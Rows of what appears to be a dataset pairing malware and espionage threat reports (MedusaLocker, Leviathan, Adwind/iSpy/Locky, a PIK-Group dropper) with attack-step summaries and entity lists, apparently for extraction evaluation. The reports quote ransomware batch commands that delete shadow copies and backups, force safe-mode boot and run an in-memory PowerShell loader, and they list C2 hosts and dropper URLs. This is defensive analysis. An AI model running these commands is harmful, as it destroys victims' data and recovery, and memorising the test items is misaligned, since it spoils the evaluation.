139.59.46[.]154/IMo8oosieVai 139.59.46[.]154:3485/eiloShaegae1 69.87.223[.]26/IMo8oosieVai 69.87.223[.]26:8080/eiloShaegae1 69.87.223[.]26:8080/pAdditional C2analytics-google[.]org:69/check.aspx analytics-google[.]org/checkFile.aspx jquerycode-download[.]live/check.aspx jquerycode-download[.]live/checkFile.aspx go-microstf[.]com/checkFile.aspx 104.218.120[.]128/check.aspx 104.218.120[.]128:69/checkFile.aspxurl "," 1. NewsBeef sends spearphishing emails with macro-enabled Office documents to targets. 2. The macro documents contain PowerShell scripts that download poisoned software installers when opened. 3. The poisoned installers are programs like Flash or Chrome but execute PowerSploit scripts when run. 4. The PowerSploit scripts download and execute the Pupy backdoor. 5. Pupy communicates over Tor to a command and control server controlled by NewsBeef. 6. NewsBeef can send modules over Pupy to further access the infected system. 7. In other attacks, NewsBeef compromises websites to inject JavaScript code. 8. The JavaScript redirects visitors to NewsBeef controlled sites based on their IP and other data. 9. These sites can then deliver the macro documents or other malicious payloads to infect the visitors. ",valid_67,"['NewsBeef', 'spearphishing emails', 'macro', 'targets', 'PowerShell scripts', 'software', 'the poisoned installers', 'Flash', 'Chrome', 'PowerSploit scripts', 'the Pupy backdoor', 'command', 'control', 'modules', 'attacks', 'websites', 'JavaScript code', 'The JavaScript', 'visitors', 'malicious payloads']",NewsBeef; spearphishing emails; macro; targets; PowerShell scripts; software; the poisoned installers; Flash; Chrome; PowerSploit scripts; the Pupy backdoor; command; control; modules; attacks; websites; JavaScript code; The JavaScript; visitors; malicious payloads.
"Cybereason vs. MedusaLocker Ransomwarecybereason.com/blog/medusalocker-ransomwareBack to Blog Cybereason Nocturnus Nov 19, 2020Research by: Tom Fakterman and Assaf DahanBackgroundThe MedusaLocker ransomware first emerged in September 2019, infecting and encrypting Windows machines around the world. There have been reports of MedusaLocker attacks across multiple industries, especially the healthcare industry which suffered a great deal of ransomware attacks during the COVID-19 pandemic.In order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in safe mode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.MedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make it even more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption practically impossible.Recently, there have been reports stating that AKO, a variant of MedusaLocker, added an element of blackmail, threatening to release stolen files publicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by Cybereason earlier this year.Although data leak extortion threats have been found in some of MedusaLocker’s ransom notes, Cybereason did not observe evidence of information actually being exfiltrated by the MedusaLocker ransomware at the time of this research.Cybereason Blocks MedusaLocker RansomwareKey Points1. High Severity: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.2. Encrypting mapped drives: MedusaLocker encrypts shared network drives of adjacent machines on the network.3. Attempted extortion: The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are not made.4. Detected and Prevented: Cybereason’s platform fully detects and prevents the MedusaLocker ransomware.Breaking Down the AttackMany MedusaLocker infections typically start with two files, a ‘batch’ file and a powershell script saved as a ‘txt’ file:qzy.bat qzy.txtContents of the Batch fileThe qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:1. Executes a Powershell script that resides in C:\Windows\SysWOW6\qzy.txt, which contains the Ransomware payload.2. Changes registry keys to allow the service to run in safe mode.3. Enforce restart in safe mode.4. Restart the infected host.sc create purebackup binpath= ""%COMSPEC% /C start /b C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -c $km = [IO.File]::ReadAllText('C:\Windows\SysWOW64\qzy.txt'); IEX $km"" start= auto DisplayName= ""purebackup""reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /freg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /ve /d \""Service\"" /fbcdedit /set {default} safeboot minimalshutdown /r /f /t 00 & del %0The batch file execution portrayed in Cybereason attack tree:1/7MedusaLocker Batch file executionAfter the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a PowerSploit script known as “Invoke-ReflectivePEInjection”. The script reflectively loads the MedusaLocker ransomware to the powershell process memory.The MedusaLocker binary encoded with base64 in the script:Powershell script snippetMutex DetectionThe first thing MedusaLocker does is to check if a process with the mutex “{8761ABBD-7F85-42EE-B272-A76179687C63}” exists on the machine. If the mutex already exists, the ransomware will stop its execution.CMSTP UAC BYPASS / Privilege EscalationMedusaLocker uses a known UAC bypass technique also used by other malware such as Trickbot that allows the ransomware to run with escalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool CMSTP.exe to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. An “%AppData%\Roaming\svchostt.exe” (depends on the malware variant). And then, creates persistence by a scheduled task named “svhost” which executes every 15 minutes:Scheduled task in CybereasonBypassing Security ProductsMedusaLocker will attempt to disable or terminate certain process and security products:wxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exeIn addition, it will attempt to disable the following services:wrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.QuickBooks.FCS,QBCFMonitorService,sqlwriter,msmdsrv,tomcat6,zhudongfangyu,SQLADHLP,vmware- usbarbitator64,vmware-converter,dbsrv12,dbeng8Deleting Backups and Preventing RecoveryMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts:Hardcoded commands in the malwareCommandPurposevssadmin.exe Delete Shadows /All /QuietDeleting all shadow copy volumesbcdedit.exe /set {default} recoveryenabled NoDisabling Automatic Startup Repairbcdedit.exe /set {default} bootstatuspolicy ignoreallfailuresDisabling Windows Error Recovery on startupwbadmin DELETE SYSTEMSTATEBACKUPDeleting backup for Windows Serverwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldestDeleting the oldest backup on Windows ServerMedusaLocker execution in the memory of powersehll.exe:3/7MedusaLocker execution from PowershellScanning and Propagating to Remote MachinesAfter a successful infection, the MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders. The ransomware edits the value “EnableLinkedConnections” of the following registry key:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Policies\System“EnableLinkedConnections” value is changedIt does that so it can connect to other adjacent hosts residing on the same network, and in addition, tries to ping the entire subnet to see which hosts are alive:Ping sweep to find live hostsEncryption Whitelist FoldersMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach, and encrypts files in most folders with the exception of:%User Profile%\AppData\ProgramData\Program Files\Program Files (x86)\AppData\Application Data\intel\nvidia\Users\All Users\WindowsRansom NoteAlthough the ransom note of MeduzaLocker states that data has been exfiltrated, we have not observed indications of such behavior at the moment by the malware:4/7Ransom noteCybereason Detection and PreventionCybereason is able to both detect and prevent the execution of MedusaLocker using the powershell protection component:Malicious powershell script preventedAdditionally, when the Anti-Ransomware feature is enabled, behavioral detection techniques in the platform are able to detect the deletion of the shadow copies using vssadmin.exe, which will create a Malop for the ransomware behaviour:Ransomware preventedMitre Att&ck BreakdownExecutionPersistencePrivilege EscalationDefense EvasionLateral MovementImpactWindows Command ShellWindows ServiceBypass User Access ControlDynamic-link Library InjectionSMB/Windows Admin SharesData Encrypted for Impact5/7PowershellScheduled ",1. Attacker delivers batch script and PowerShell loader script 2. Batch script creates service for persistence and restarts in safe mode 3. Service executes PowerShell loader script 4. Loader script reflects MedusaLocker ransomware binary into memory 5. Ransomware terminates processes and disables services of security products 6. Ransomware deletes backups and shadow copies 7. Ransomware scans subnet for other hosts and shares 8. Ransomware encrypts files on local and remote hosts 9. Ransomware displays ransom note threatening data leak extortion ,valid_12,"['Attacker', 'Batch', 'Powershell', 'persistence', 'restarts', 'safe mode', 'MedusaLocker ransomware', 'memory', 'services', 'security products', 'Backups', 'copies', 'subnet', 'other hosts', 'shares', 'files', 'ransom note', 'data', 'extortion']",Attacker; Batch; Powershell; persistence; restarts; safe mode; MedusaLocker ransomware; memory; services; security products; Backups; copies; subnet; other hosts; shares; files; ransom note; data; extortion.
"Targeted Attack Campaigns with Multi-Variate Malware Observed in the Cloudnetskope.com/blog/targeted-attack-campaigns-multi-variate-malware-observed-cloudAbhinav SinghMarch 8, 2017This website uses cookies We use cookies to personalise content and ads, to provide social media features and to analyse trafﬁc. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services. To opt-in, select ok, otherwise select settings to set opt-out preferences.OK Show detailsThis website uses cookies for advertising and analytics purposes as described in our cookie policy. For more information and to set preferences, please click here. By continuing to browse this website, you accept our use of cookies.×url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeNetskope Threat Research Labs has observed ongoing targeted attacks in enterprise cloud environments that lead to a malware fan-out effect through automated syncing and sharing of ﬁles in the cloud. While monitoring this attack, we captured several instances where the synced ﬁlenames were similar to the email addresses of the attack victims. These attachments are often automatically synced to cloud storage applications using ﬁle collaboration settings in popular SaaS applications like Ofﬁce365, Google mail etc. This auto-syncing feature can also be achieved through third party applications as well. Since the ﬁlenames appear less suspicious, they are more likely to be viewed as coming from within the organization (and therefore trusted) and shared with others in the same user group.Figure 1 illustrates this effect in a cloud environment and how Netskope detects the attack patterns at various stages.Figure 1: Infection propagation in the Cloudurl Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeThe synced ﬁles were all zipped and contained obfuscated JavaScript. Over the course of this campaign, Netskope Threat Protection detected variations in both zipped JavaScript as well as the ﬁnal payload that would be delivered once the JavaScript was executed. Changes in JavaScript were limited to varying obfuscation techniques, but there were three variations in ﬁnal payload over the course of time. The payload’s variations were associated with keyloggers, remote access trojans, and more importantly, ransomware. Some of these samples would disable endpoint antivirus software, leaving the enterprise to rely on a remote scan engine like Netskope Threat Protection.Consider the example recipient as joey.tribbiani@example.com, we noticed following variations in attachment names for the targeted emails:Joey.tribbiani[0-9A-Z]{6,8}_[0-9A-F]{6,8}.zipJoey.trbbiani_proposal_[0-9A-F]{6}.zipPdf_letter-joey.tribbiani_[0-9A-F]{6}.zip Attack Vector The attack vector follows the usual infection pattern in which the attached zip ﬁle contains an obfuscated JavaScript. We have noticed variations in the wrapper JavaScript indicating that the attackers were attempting multiple ways to circumvent the corporate environment. Netskope Threat Protection detects the attached zip ﬁle and obfuscated JavaScript inside as Gen.Downloadrs.B1F4C42E,Gen.Downloadrs.10CC4FE0 and Generic.JS.DownloaderS.B1F4C42E respectively. Obfuscated JavaScripts During our investigation, we observed two variations of the obfuscated JavaScript that were delivered as zip attachments to the recipients. First Variation is shown in Figure 2.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 2 : Simpliﬁed version of the obfuscated wrapper JavaScript.The above JavaScript creates a Windows script host object to establish connection with the hard- coded url (astralopitec[.]yomu[.]ru) in object named “dingy”. The fetched malware payload is then stored in the %TEMP% directory. Second Variation with domains hosting the payloads. The box in ﬁgure 3 shows the fully constructed domain names once the script is completely deobfuscated.The dropped payload is again saved with a random name in the %TEMP% directory. Payload Variations We noticed three different variations in the payloads delivered using the obfuscated JavaScript. These payloads belong to Adwind RAT, iSpy keylogger and Locky ransomware families detected by Netskope Threat protection as Backdoor.Generckd.3312003, Gen:Variant.Rzy.73941 and Backdoor.Agnt.CDQB. Payload Variation 1 : Adwind RAT Netskope detection: Backdoor.Generckd.3312003The ﬁrst payload that we encountered while tracking this campaign was an instance of cross- platform, Java based Adwind RAT, which has the capability to infect Windows, Linux and Macs as shown in Figure 4.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 4: Excerpt of decompiled Jar of Adwind RATThe RAT has the capability to launch a shell connectivity giving backdoor access to the attacker and has basic ﬁle stealing features. Figure 5 below shows the class ﬁles which form the crux of the RATs capabilities.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 5: Adwind RAT capabilities deﬁned in the decompiled codeUpon execution on a typical windows environment, the RAT will create a random user proﬁle and will attempt to create persistence by registering an entry into HKCU Run key:“reg.exe” (Access type: “SETVAL”; Path: “HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN”; Key: “HP”; Value: “”%APPDATA%\Oracle\bin\javaw.exe” -jar “%USERPROFILE%\QI\giwauQII.cvLwffAX””)The jar ﬁle constructs multiple VB scripts onto the disk, which are executed by launching an instance of command prompt. These visual basic scripts creates WMI command line queries and checks for system information like anti-virus programs, ﬁrewall settings etc. A snapshot of the scripts is shown in ﬁgure 6. Adwind also copies relevant Java Runtime ﬁles to Appdata using xcopy command.Figure 6: VB scripts created by the RAT to gather system informationThe sample tried connecting to a dynamic dns domain, securitypoint[.]ddns[.]net. Hosting C&C servers on dynamic DNS services helps attackers in quickly switching their IPs without changing the host. Payload Variation 2 : iSpy Keylogger Netskope detection: Gen:Variant.Rzy.73941The next instance of malware was observed to be the popular iSpy keylogger, which is sold in a subscription based model in underground forums. iSpy is a .Net compiled keylogger that comes packed with loads of additional features like stealing browser history, webcam logging, keystroke recording, clipboard monitoring etc. Figure 7 shows the captured strings in memory when the keylogger is installed onto the system.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - Netskopeurl Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 7: iSpy keylogger activities captured in memory stringsUpon execution, the malware creates a copy of itself in \App Data\Roaming\Microsoft\Windows\ScreenToGif.The malware maintains persistence by creating registry entries in HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache. The entry is made to invoke a payload activator executable that checks for running instances of the main iSpy payload based on the mutex. If the malware is not already loaded in the memory, It will launch its new instance. The payload loader is stored in the %TEMP% directory. Parts of the decompiled code can be seen in Figure 8.Figure 8: Payload loader’s decompiled codeThe code will look for running instance of process named “netprotocol” and sleeps if it is already loaded into the memory. It will spun up a new process by invoking the copy of malware stored in the ScreenToGif folder.Apart from the keylogging and information stealing features, iSpy also makes sure that it disables any known running instances of a wide variety of anti-virus programs onto the system as shown in Figure 9.Figure 9: Process names of anti-virus solutions targeted by iSpy keyloggerThe beneﬁt of using a cloud security solution like Netskope is that they are not affected by such counter-measures implemented by sophisticated malware.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeThe malware stores the exﬁltrated data in a ﬁle in the %TEMP% directory and sends the harvested data to the C&C, westech-solar[.]co. At the time of analysis, the C&C was unresponsive. Payload Variation 3: Variant of Locky/Zepto Sample hash: 6968F0AF128C27C6C970ADC0B301D204 Netskope detection: Backdoor.Agnt.CDQBThe third and last payload noticed during our monitoring, belongs to Locky ransomware family. We observed a variant of Locky being delivered as the ﬁnal payload once the user executes the attached JavaScript. We have blogged about a detailed analysis of the variant Zepto here. The samples noticed during this campaign were no different from the one we disclosed in our blog. There were slight variations in the ﬁrst level JavaScript where the payload execution parameters were slightly obfuscated.Figure 10: Ransom message from Locky/Zepto Conclusion Sending malicious attachments through emails is not new, but remains a very popular method for delivering targeted attacks. By crafting an attack vector that leaves little for many existing enterprise security solutions, it becomes easy for attackers to infect users and network. Organizations using cloud storage apps further amplify the attack vector when the malicious ﬁles and payloads is synced across multiple users. General recommendations Netskope recommends following course of actions to effectively counter such threats:Detect and remediate all threats at rest in sanctioned cloud services using a threat-aware Cloud Access Security Broker like Netskope. Detect and remediate all threats being downloaded from unsanctioned cloud services using a threat-aware solution like Netskope.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeScan ﬁles using remote scanning services like Netskope Advanced Threat Protection, that cannot be disabled by malware. Regularly back up and turn on versioning for critical content in cloud services. Avoid opening email attachments if it appears to be coming from unknown sources. Disable automatic unzipping of ﬁles and avoid clicking on any JavaScript that comes as zipped archive unless fully veriﬁed by the sender or IT administrator. Actively track usage of unsanctioned cloud services and enforce DLP policies to control ﬁles and data entering and leaving your corporate environment. Keep systems and antivirus updated with the latest releases and patches.Contact Us We'd love to hear from you!url ","1. The attacker sends emails with zipped JavaScript attachments to targeted victims. The filenames resemble the recipient's email address. 2. The JavaScript attachments exploit Windows Script Host to connect and download a malicious payload from the attacker's server. 3. The payload is saved in the %TEMP% directory with a random name. Variants include Adwind RAT, iSpy keylogger, and Locky ransomware. 4. The malicious payload executes on the victim's machine, establishing persistence and disabling antivirus. 5. The payload exfiltrates data like keystrokes and system info back to the attacker's command and control server. 6. The victim syncs the infected file to cloud storage apps, spreading it to additional users. 7. Netskope detects the attack at multiple stages - initial attachment, obfuscated JavaScript, and final payload. 8. Netskope blocks unsanctioned cloud access, scans files remotely, and enforces data policies to protect the cloud environment. ",valid_1,"['the attacker', 'emails', 'the JavaScript', 'Windows Script Host', 'The payload', 'the %TEMP% directory', 'a random name', 'Variant', 'Adwind RAT', 'iSpy keylogger', 'Locky', 'persistence', 'antivirus', 'data', 'system info', 'cloud storage apps', 'users', 'Netskope', 'obfuscated JavaScript', 'the cloud']",the attacker; emails; the JavaScript; Windows Script Host; The payload; the %TEMP% directory; a random name; Variant; Adwind RAT; iSpy keylogger; Locky; persistence; antivirus; data; system info; cloud storage apps; users; Netskope; obfuscated JavaScript; the cloud.
"Leviathan: Espionage actor spearphishes maritime and defense targets Overview Proofpoint researchers are tracking an espionage actor targeting organizations and high-value targets in defense and government. Active since at least 2014, this actor has long-standing interest in maritime industries, naval defense contractors, and associated research institutions in the United States and Western Europe. Key takeaways from this research include: ·Industry_targeting: The actor targets defense contractors, universities (particularly those with military research ties), legal organizations [3] and government agencies [3]. The actor has particular interest in naval industries including shipbuilding and related research Geographical targeting: Targeting includes United States, Western Europe, and South China Sea Tools: Custom JavaScript malware known as Orz and “NanHaiShu, Cobalt Strike, the SeDIl JavaScript loader, and MockDIl dll loader .Delivery: Emailed attachments and URLs, often employing a fraudulent lookalike domain and stolen branding ·Exploitation: Microsoft Excel and Word documents with macros (sometimes password-protected), very recent vulnerabilities such as CVE-2017-0199and CVE-2017-8759, and malicious Microsoft Publisher files Installation: JavaScript, JavaScript Scriptlets in XML,HTA, PowerShell, WMI, regsvr32, Squiblydoo Lateral Movement:The actor sometimes utilizes access at one compromised organization to attack the next. For example, compromised email accounts at one organization were used to send the next wave of malicious attachments to potential victims in the same industry. Similarly the actor attempts to compromise servers within victim organizations and use them for command and control (C&C) for their malware. This blog traces key activities connected to this actor and examines a number of their tools and techniques. Campaigns and details are presented in reverse chronological order to highlight the group's most recent activities. Delivery and Exploitation September 2017 On September 15 and 19, 2017, Proofpoint detected and blocked spearphishing emails from this group targeting a US shipbuilding company and a US university research center with military ties. Example emails used the subject “Apply for internship position” and contained an attachment “resume.rtf”. Another attachment, “ARLUAS_FieldLog_2017‑08‑21.doc” contained a “Torpedo recovery experiment” lure. The attachments exploited CVE‑2017‑8759 which was discovered and documented only five days prior to the campaign. August 2017 Between August 2 and 4, the actor sent targeted spearphishing emails containing malicious URLs linking to documents to multiple defense contractors. Some of this activity was documented and observed by a fellow researcher. Many of the documents, C&C domains, and payload domains abused the brand of a major provider of ships, submarines, and other vessels with military applications. Some of the documents exploited VE‑2017‑0199 to deliver the payload. Other documents were Microsoft Publisher files that relied on social engineering. The potential victims were lured into starting an embedded PowerPoint presentation, moving the mouse to trigger execution of an embedded JavaScript [5], and then pressing “Enable” in a warning dialog to cause the payload download. The Publisher files were poorly crafted, relied on multiple user interactions, and contained multiple grammatical and typographic errors. February 2015 From February to October of 2015, our colleagues at F‑Secure and McAfee reported on campaigns [3][4] by this actor targeting South China Sea interests. During this time, the group utilized Microsoft Excel and Word documents with macros to target the Philippines Department of Justice, APEC organizers, and an international law firm. Targeting of these companies is different from that which we typically observe for this actor; however it still centers around marine and naval issues as related to South China sea politics. November 2014 The period between November 2014 and January 2015 marked one of the earlier instances in which Proofpoint observed persistent exploitation attempts by this actor. The actor generally emailed Microsoft Excel documents with malicious macros to US universities with military interests, most frequently related to the Navy. The actor also occasionally used macro‑laden Microsoft Word documents to target other US research and development organizations with military and intelligence ties during this period. Emails were often very simple with a greeting and an attachment. On other occasions, it appears that the attackers used highly topical lures based on current events or legitimate documents stolen from previous victims. Lure topics included symposia, the Navy, IT, and relevant research. Installation The actor continues to: Innovate and modify the code that accomplishes the installation, while the backdoor code remains more static Use scripting languages such as JavaScript, JavaScript Scriptlets, VBScript, and XML Use simple obfuscation such as base64, gzip compression, and insertion of garbage characters Split functionality of the backdoor & code that establishes persistence for the backdoor into separate files and scripts. Example 1: Resume.rtf The “resume.rtf” file from the September 19, 2017 attack retrieves the malicious SOAP WSDL definition named “readme.txt “ using an anonymous FTP logon to the attacker’s server. This definition in turn downloads a VBScript favicon.ico file, which then creates and runs two JavaScript files in the %TMP% directory: The job of the smaller of the two JavaScripts is to establish a system autostart mechanism. It accomplishes this by deobfuscating another script, link.js, into %TMP%. Link.js in turn creates a shortcut file Java(TM) Platform SE Auto Updater.lnk in the Startup special folder pointing to the main backdoor JavaScript. The job of the larger of the two JavaScripts is to download and execute the Cobalt Strike payload. It accomplishes this by writing more code to rWug5n0PHUFjDFyb8k.js in the temporary directory, which then runs a PowerShell command (obfuscated using garbage characters, base64 encoding, and Gzip compression). The PowerShell is a default Cobalt Strike downloader.The malicious script executed by the Microsoft Publisher file downloads and runs yet another JavaScript file, 0.js, hosted on the attacker‑controlled server: Similar to the previous example (resume.rtf), the 0.js handles the system autostart mechanism via a shortcut file office 365.lnk in the Startup special folder. However, the shortcut abuses the “Squiblydoo” technique. Moreover, the backdoor is not run directly but via an intermediary SeDll (see below). 0.js also downloads two additional files from the C&C server (green.ddd and green.tmp) The first of these files, green.ddd, is an executable file internally named “SEDll_Win32.dll”. This is a known backdoor used by this actor since 2014 for the same purpose: decrypting and executing the final JavaScript backdoor “Orz”. Tools NanHaiShu We have observed variants of this JavaScript backdoor used in various campaigns, including those publically reported. The actor continues to improve and refine the malware by, for example, wrapping it inside an HTA wrapper. Several good descriptions are available in analyses from fellow researchers [3][4]. Basic functionality includes: Information gathering (computer name, user name, serial number, proxy server) Downloading from URL Executing other JavaScript Registry, system, process, directory, file operations SafeIE (change IE settings to reduce warnings about about malware activity). We observed this backdoor in an August 2017 campaign dropped by the Microsoft Publisher files, as well as much earlier in 2014. We named it due to a variable name “orz”, which is changed to “core” in the more recent version. The actor consistently tweaks and improves this backdoor as well. The backdoor is a fairly involved script malware. Its functionality includes: Information gathering (IE version, OS version, OS 64‑bit/32‑bit, etc) Overwriting registry settings to reduce malware visibility on system Download file Upload file Execute a command with cscript Execute JavaScript Execute shell command Execute a dll (via an embedded ‘MockDll') Get proxy info Get process list Terminate process Get drive info.","1. Spearphishing - Send emails with malicious Office docs or links to targets. 2. Exploitation - Use embedded macros, Flash exploits, etc. to execute initial code. 3. Staging - Retrieve and execute multi-stage JavaScript payloads. 4. Installation - JavaScript installs backdoors like Orz and NanHaiShu. 5. Persistence - Create registry keys, shortcuts, scheduled tasks, etc. to re-execute backdoor. 6. C2 Beaconing - Backdoors connect to command and control servers to receive commands. 7. Lateral Movement - Compromise additional systems on the network for C2 and pivoting. 8. Data Exfiltration - Use backdoors to gather and send out sensitive documents and emails. ",valid_50,"['emails', 'US', 'Office', 'targets', 'Exploitation', 'macros', 'Execute', 'code', 'JavaScript', 'Installation', 'Orz', 'NanHaiShu', 'persistence', 'command', 'control', 'servers', 'system', 'documents']",emails; US; Office; targets; Exploitation; macros; Execute; code; JavaScript; Installation; Orz; NanHaiShu; persistence; command; control; servers; system; documents.
"2/11/2020Ransomware, Trojan and Miner together against “PIK-Group” – Marco Ramilli Web CornerRansomware, Trojan and Miner together against “PIK-Group”marcoramilli.com/2019/02/28/ransomware-trojan-and-miner-together-against-pik-groupView all posts by marcoramilliFebruary 28, 2019When an unknown sender suggests me to click on a super wired url, dropping a ZIP ﬁle straight in my box, by saying it’s getting the next targeted attack on a huge company, well I kinda looking forward to it ! So I clicked on the link (see IOC section) and I’ve downloaded a “pik.zip” ﬁle. The zip ﬁle wrapped out an interesting “cyrillic looking” javascript ﬁle named: Группа Компаний ПИК подробности заказа, which according to google translate would be: “PIK Group of Companies order details”. It looks like a crafted ﬁle for PIK-Group ,one of the most important real estate companies based in Russia with more then 14k employees ! By analysing such a script it’s clear that it wont be a piece of cake. The script is heavily obfuscated with more techniques. As you might appreciate from Stage0 (following image) there are two main obfuscation streams: the ﬁrst one is implemented by introducing fake static forks such as: “if” and “cases” and the second one is implemented by dynamically building function blocks from nested strings which are either dynamically built and separated into multiple concatenation steps.The script eventually drops and executes (Stage0 Execution phase follows) a fake image ﬁle (msg.jpg) which actually is an UPX packet windows PE acting as second stage. The second stage drops and executes three additional modules: a backdoor, a Miner and ﬁnally a quite known Ransomware. It actually weird to understand the attacker’s needs, at such point, why so many different actors in an unique attack ?Javascript Stage0According to pcrisk, the ﬁrst downloaded module (327B0EF4.exe) looks like a well-known Troldesh Ransomware. This particular ransomware renames ﬁles so that they comprise a line of characters and digits and adds the “.crypted000007” extension to each. For example, after encryption, the ﬁle “1.jpg” might have an appearance similar to this example: “hmv8IGQE5oYCLEd2IS3wZQ==.135DB21A6CE65DAEFE26.crypted000007”. Furthermore, Crypted000007 creates ten ransom-demand messages (with identical content) called “README1.txt”, “README2.txt” … “README10.txt” and places them on the desktop. This virus also changes the desktop wallpaper. The following image shows the ransom note that I’ve got during the infection phase.Stage0 Executionurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web CornerThe second installed module (37ED0C97.exe) is well-known piece of software as well. It’s a Miner called nheqminer. Nheqminer is a great implementation of equihash mining, mainly used on NiceHas but forked many times and todays is getting used for several spare projects as well. Nheqminer is a speciﬁc miner for Zcash value based on common PCs. You might want to checkout more here. Exploring memory snapshots during its execution can be easy to ﬁgure out the miner runs over Zcash.Flypool server mining for the following wallet address.Ransomware NoteAccording to zcashnetwork the attacker’s wallet received from mining activity 4.89 ZCash (lsat transaction on February 26th, 2019) so far. This amount suggests that the attacker activity is started (re-started) few days ago or its infected botnet is not so big at that time.According to Virustotal the third installed module ( B56CE7B7.exe) is another well-known software called Trojan-Heur and (in)famous during 2017 to perform brute force attack on WordPress based websites.Attacker WalletA typical behaviour for Trojans like HEUR.Trojan.Win32.Generic is one or all of the following: Download and install other malware. Use your computer for click fraud. Record your keystrokes and the sites you visit. Send information about your PC, including usernames and browsing history, to a remote malicious hacker. Give a remote malicious hacker access to your PC. Advertising banners are injected with the web pages that you are visiting. Random web page text is turned into hyperlinks. Browser popups appear which recommend fake updates or other softwareIndeed it behaviour perfectly ﬁts the Malware family behaviour. Once installed on victim PC it starts to brute force many websites looking for weak credentials. Once it ﬁnds weak credentials it installs itself into the WordPress website maintaining the original name: “pik.zip”. Thanks to this characteristic it would be possible to enumerate infected website through a combined searches on google engine (please see dropping urls).url Trojan and Miner together against “PIK-Group” – Marco Ramilli Web Cornerurl Trojan and Miner together against “PIK-Group” – Marco Ramilli Web CornerBruteForce Module and installation pathThe following image shows the main actor connections and their relationships. The analysed implant is quite interesting since rises many questions, for example: Why the attacker pretends to build a targeted attack to PIK-Group (using crafted strings) with refurbished malware ? Why the implant installs a “miner” and a “ransomware” as well ? While it might be understandable the usage of software for harvesting money, why the attacker introduced a brute force Trojan bot ?url Trojan and Miner together against “PIK-Group” – Marco Ramilli Web CornerMain actors mapOn my personal point of view it’s a quite weird behaviour goes pretty far from classical state sponsored attacks. We are facing an actor who apparently wants money (ransomware and miner), but also wants credentials and want to be able to control victim’s box in future. But we are facing again an actor who is using the victim to brute force third party random websites as well. This activity is quite heavy and it ‘s easy to be detected and to be blocked from security administrators or IT guys, which is clearly, in opposition to mining (which wants to remain stealth as more as possible) and to trojan as well (who wants to propagate itself silently). We might assume a malware building factory who is overselling a small botnet. In any case I don’t think it would be a state sponsored attack against PIK-Group but rather a nice way to maximise proﬁts on a realtive small botnet.IOC:Following the dissected IOC. Command and Control IoC refers to Heur Malware family, hashes refer to found evidences ﬁles, dropping urls refer to ﬁrst infection url, in other words where the ﬁnal victims could drop and execute Stage0. TrojanVictims (Brute-forced websites) refer to the trojan Heur victims. Those victims are not the original victims (the ones got infected by opening the original zip ﬁle) but the trojan Heur victims. In other words are the victim of the brute force attack such a module does during its life.URL C2:despari[.]informatik[.]uni-erlangen[.]de belegost[.]csail[.]mit[.]edu 95[.]154[.]221[.]3 morty[.]ultrasrv[.]de 92[.]117[.]130[.]61 http[:]//caffeportici[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//www[.]jantichy[.]cz/wp-content/themes/twentytwelve/css/pikz[.]zip http[:]//subdomain[.]petstores[.]com/pikz[.]zip http[:]//pcmamoru[.]com/cd/pikz[.]zip http[:]//cdvo[.]it/wp-content/blogs[.]dir/pikz[.]zip http[:]//nkybcc[.]com/templates/jsn_decor_pro/backups/pikz[.]zip http[:]//shiodashika[.]com/topix/img/pikz[.]zip http[:]//www[.]wisconsinweimaraners[.]com/wp-content/themes/eclipse/includes/pikz[.]zip http[:]//mkt-msk[.]ru/errordocs/style/pikz[.]zip http[:]//chansomania[.]fr/wp-content/themes/twentyten/languages/pikz[.]zip https[:]//mdlab[.]ru/ﬁles/pikz[.]zip http[:]//ccs-moscow[.]ru/libraries/cms/captcha/pikz[.]zip http[:]//www[.]ﬂowerbed[.]cz/templates/ﬂowerbed_v1/css/pikz[.]zip 